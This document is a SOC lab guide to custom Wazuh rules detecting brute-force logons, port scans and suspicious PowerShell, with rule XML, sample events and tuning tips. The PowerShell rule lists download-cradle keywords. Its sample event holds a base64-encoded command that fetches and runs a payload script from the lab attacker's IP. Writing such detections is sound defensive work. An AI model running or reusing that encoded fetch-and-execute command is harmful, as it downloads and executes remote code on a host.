# Wazuh Detection Rules for SOC Lab

## Overview

This document provides custom Wazuh rules for:

1. brute-force login attempts with `5+` failed logons
2. `Nmap`-style port scanning detection
3. suspicious PowerShell execution

These rules are designed for the Windows 10 victim in the lab and should be added to:

```text
/var/ossec/etc/rules/local_rules.xml
```

After saving the rules, restart the Wazuh manager:

```bash
sudo systemctl restart wazuh-manager
```

You can test the rules with:

```bash
/var/ossec/bin/wazuh-logtest
```

## Assumptions

- Windows logs are collected through `EventChannel`
- failed logons are coming from Windows Security logs
- Sysmon is installed and forwarding `Microsoft-Windows-Sysmon/Operational`
- Windows Filtering Platform or firewall-related connection events are enabled for scan visibility

Field names can vary slightly depending on the Windows event version and Wazuh decoder output, so validate them with `wazuh-logtest` in your environment.

Official references used:

- [Wazuh custom rules](https://documentation.wazuh.com/current/user-manual/ruleset/rules/custom.html)
- [Wazuh rules syntax](https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html)
- [Wazuh Windows event channel collection](https://documentation.wazuh.com/current/user-manual/capabilities/log-data-collection/configuration.html)
- [Wazuh rule testing](https://documentation.wazuh.com/current/user-manual/ruleset/testing.html)

## Wazuh Rule Format

Use the following XML inside `local_rules.xml`:

```xml
<group name="custom_windows_detection,">

  <!-- 1. Base rule: single failed Windows logon -->
  <rule id="100100" level="5">
    <location>EventChannel</location>
    <field name="win.system.channel">^Security$</field>
    <field name="win.system.eventID">^4625$</field>
    <description>Windows failed logon detected for user $(win.eventdata.targetUserName) from $(win.eventdata.ipAddress)</description>
    <group>windows,authentication_failed,bruteforce_candidate,</group>
  </rule>

  <!-- 1. Correlation rule: 5 or more failed logons from the same source IP -->
  <rule id="100101" level="12" frequency="5" timeframe="120">
    <if_matched_sid>100100</if_matched_sid>
    <same_field>win.eventdata.ipAddress</same_field>
    <description>Possible brute-force attack: 5 or more failed logons from $(win.eventdata.ipAddress) within 120 seconds</description>
    <group>windows,authentication,bruteforce,attack,</group>
    <mitre>
      <id>T1110</id>
    </mitre>
  </rule>

  <!-- 2. Base rule: inbound Windows Filtering Platform connection event -->
  <rule id="100110" level="4">
    <location>EventChannel</location>
    <field name="win.system.channel">^Security$</field>
    <field name="win.system.eventID">^5156$</field>
    <field name="win.eventdata.sourceAddress" type="pcre2">^(?!127\.0\.0\.1)(?!::1).+</field>
    <description>Windows Filtering Platform allowed a network connection from $(win.eventdata.sourceAddress) to local port $(win.eventdata.destPort)</description>
    <group>windows,network,portscan_candidate,</group>
  </rule>

  <!-- 2. Correlation rule: same source IP hitting many different destination ports -->
  <rule id="100111" level="10" frequency="10" timeframe="60">
    <if_matched_sid>100110</if_matched_sid>
    <same_field>win.eventdata.sourceAddress</same_field>
    <different_field>win.eventdata.destPort</different_field>
    <description>Possible port scan: source $(win.eventdata.sourceAddress) connected to 10 or more different destination ports within 60 seconds</description>
    <group>windows,network,portscan,reconnaissance,attack,</group>
    <mitre>
      <id>T1046</id>
    </mitre>
  </rule>

  <!-- 3. Suspicious PowerShell execution from Sysmon -->
  <rule id="100120" level="9">
    <location>EventChannel</location>
    <field name="win.system.channel">^Microsoft-Windows-Sysmon/Operational$</field>
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.image" type="pcre2">(?i)\\powershell(\.exe)?$|\\pwsh(\.exe)?$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-enc\b|-encodedcommand\b|iex\b|invoke-expression\b|downloadstring\b|downloadfile\b|frombase64string\b|bypass\b|hidden\b|nop\b|windowstyle\s+hidden)</field>
    <description>Suspicious PowerShell execution detected: $(win.eventdata.commandLine)</description>
    <group>windows,sysmon,powershell,execution,suspicious_process,attack,</group>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

</group>
```

## 1. Brute Force Login Attempts

### Rule logic

- `100100` matches a single failed Windows logon using Security Event ID `4625`
- `100101` raises the higher severity alert when the same `ipAddress` appears `5` times within `120` seconds

### Why it works

Windows records failed authentication attempts in the Security log as `4625`. Correlating repeated failures from the same source IP is a practical way to identify password spraying or brute-force behavior.

### Example triggering log

This is an example event that would match the base rule:

```json
{
  "location": "EventChannel",
  "win": {
    "system": {
      "channel": "Security",
      "eventID": "4625",
      "computer": "WIN10-VICTIM"
    },
    "eventdata": {
      "targetUserName": "administrator",
      "ipAddress": "192.168.56.30",
      "logonType": "10",
      "status": "0xc000006d",
      "subStatus": "0xc000006a"
    }
  }
}
```

This alert escalates when five similar events arrive from `192.168.56.30` in two minutes.

## 2. Nmap Port Scanning Detection

### Rule logic

- `100110` matches Windows Security Event ID `5156`, which logs an allowed network connection
- `100111` looks for the same `sourceAddress` reaching many different `destPort` values in a short window

### Why it works

An `Nmap` scan often touches many ports rapidly from one IP. On a monitored Windows victim, that behavior is better seen in Filtering Platform or firewall connection events than in Sysmon process logs, because the scan is coming into the host.

### Important requirement

This rule depends on the victim generating connection events such as `5156`. If you do not see them, enable the related Windows auditing or firewall logging first.

### Example triggering log

This is an example event that would match the base rule:

```json
{
  "location": "EventChannel",
  "win": {
    "system": {
      "channel": "Security",
      "eventID": "5156",
      "computer": "WIN10-VICTIM"
    },
    "eventdata": {
      "sourceAddress": "192.168.56.30",
      "sourcePort": "49822",
      "destAddress": "192.168.56.20",
      "destPort": "445",
      "protocol": "6",
      "application": "System"
    }
  }
}
```

This alert escalates when the same source hits ten or more different destination ports within sixty seconds, which is consistent with reconnaissance.

## 3. Suspicious PowerShell Execution

### Rule logic

Rule `100120` matches Sysmon Process Creation Event ID `1` when:

- the process image is `powershell.exe` or `pwsh.exe`
- the command line contains suspicious indicators such as:
  - `-enc` or `-EncodedCommand`
  - `IEX` or `Invoke-Expression`
  - `DownloadString`
  - `FromBase64String`
  - `-nop`
  - `-WindowStyle Hidden`
  - `bypass`

### Why it works

These command-line patterns are common in malicious or hands-on-keyboard activity because they try to hide execution, avoid policy controls, or pull down remote content. The rule is intentionally focused on strong behavioral indicators rather than all PowerShell use.

### Example triggering log

```json
{
  "location": "EventChannel",
  "win": {
    "system": {
      "channel": "Microsoft-Windows-Sysmon/Operational",
      "eventID": "1",
      "computer": "WIN10-VICTIM"
    },
    "eventdata": {
      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMwAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      "parentImage": "C:\\Windows\\System32\\cmd.exe",
      "user": "WIN10-VICTIM\\labuser"
    }
  }
}
```

This would trigger because the process is PowerShell and the command line includes `-nop`, `hidden`, and `-enc`.

## Tuning Guidance

- brute force:
  - exclude known vulnerability scanners or admin jump boxes if needed
  - consider also correlating on username with `same_field>win.eventdata.targetUserName</same_field>` if password spraying is noisy
- port scan:
  - raise the threshold if normal management tools touch many ports
  - add exclusions for known scanners used by your team
- PowerShell:
  - exclude sanctioned automation scripts or management platforms
  - consider a separate lower-severity rule for all PowerShell use and keep this one high-confidence

## Quick Validation Commands

Use `wazuh-logtest` on the manager:

```bash
/var/ossec/bin/wazuh-logtest
```

Then paste one of the example JSON events to confirm:

- the expected fields are decoded
- the base rule matches
- the correlation rule escalates after repeated submissions

## Summary

- `100101` detects repeated failed logons consistent with brute force
- `100111` detects a likely `Nmap`-style port scan from one source to many destination ports
- `100120` detects suspicious PowerShell execution using high-signal command-line indicators
